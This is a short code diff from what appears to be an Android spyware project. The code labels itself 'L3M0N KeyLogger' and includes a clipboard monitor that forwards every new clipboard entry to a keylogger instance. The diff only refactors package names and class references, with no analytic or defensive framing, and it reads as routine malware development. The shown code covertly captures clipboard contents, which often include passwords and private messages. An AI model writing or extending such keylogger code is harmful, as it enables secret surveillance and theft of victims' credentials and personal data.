@@ -1,4 +1,4 @@
-package com.etechd.l3mon.keylogger;
+package com.etechd.l3mon;
 
 import android.content.ClipData;
 import android.content.ClipboardManager;
@@ -6,8 +6,6 @@ import android.content.Context;
 import android.os.Handler;
 import android.os.Looper;
 import android.util.Log;
-
-import com.etechd.l3mon.L3MONKeyLogger;
 
 /**
  * Clipboard Monitor for L3M0N KeyLogger
@@ -93,7 +91,7 @@ public class ClipboardMonitor {
                         lastClipboardContent = currentContent;
 
                         // Send to KeyLogger
-                        L3MONKeyLogger keyLogger = L3MONKeyLogger.getInstance();
+                        L3M0NKeyLogger keyLogger = L3M0NKeyLogger.getInstance();
                         if (keyLogger != null) {
                             keyLogger.onClipboardChanged(currentContent);
                         }
